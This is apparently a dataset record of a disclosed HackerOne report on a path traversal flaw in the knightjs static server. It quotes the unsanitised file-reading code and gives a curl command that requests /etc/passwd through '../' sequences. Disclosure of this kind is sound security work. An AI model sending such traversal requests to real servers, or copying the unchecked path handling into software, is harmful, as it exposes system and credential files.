{
  "reported_to": "Node.js third-party modules",
  "reported_by": "abdilahrf_ ",
  "title": "[knightjs] Path Traversal allows to read content of arbitrary files",
  "content": "\nI would like to report Path Travelsal in Knightjs\nIt allows attacker to read content of arbitary file on remote server.\nModule\nmodule name: Knightjs\nversion: 0.0.1\nnpm page: https://www.npmjs.com/package/knightjs\nModule Description\nknight is a simple static server without configuration on the top of Node.js.\nModule Stats\n~ 10-20 / month\nVulnerability\nVulnerability Description\nThere is no sanitation to the path provided from requests\nCode 618 Bytes\n1            fs.readFile(pathname, (err, data) => {\n2                if (err) {\n3                    res.statusCode = 500\n4                    res.end(`Error getting the file: ${err}.`)\n5                } else {\n6                    res.statusCode = 200\n7                    // based on the URL path, extract the file extention. e.g. .js, .doc, ...\n8                    const ext = path.parse(pathname).ext\n9                    // if the file is found, set Content-type and send data\n10                    res.setHeader('Content-type', mime[ext] || 'text/plain')\n11                    res.end(data)\n12                }\n13            })\nand if the file exist they will print the data\nSteps To Reproduce:\nnpm i knightjs\nnode node_modules/knightjs/bin/knight\ncurl --path-as-is http://localhost:4000/../../../../../../etc/passwd -v\nknightjs-path-traversal.PNG (F340872)\nWrap up\nI contacted the maintainer to let them know: N]\nI opened an issue in the related repository: N\nImpact\nIt allows attacker to read content of arbitary file on remote server.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1541168400,
  "report_url": "https://hackerone.com/reports/403707",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install knightjs using npm: npm i knightjs"
    ],
    [
      2,
      "Run the server: node node_modules/knightjs/bin/knight"
    ],
    [
      3,
      "Exploit the path traversal vulnerability using curl: curl --path-as-is http://localhost:4000/../../../../../../etc/passwd -v"
    ]
  ],
  "vuln_description": "The vulnerability is a path traversal issue in Knightjs, a simple static server, which allows an attacker to read arbitrary files on the remote server due to lack of path sanitization.",
  "reason": "The vulnerability is straightforward to discover as it involves a common security flaw (path traversal) in a simple static file server. The attack does not require complex interactions or state manipulations, and the exploit is a well-known pattern in web security.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}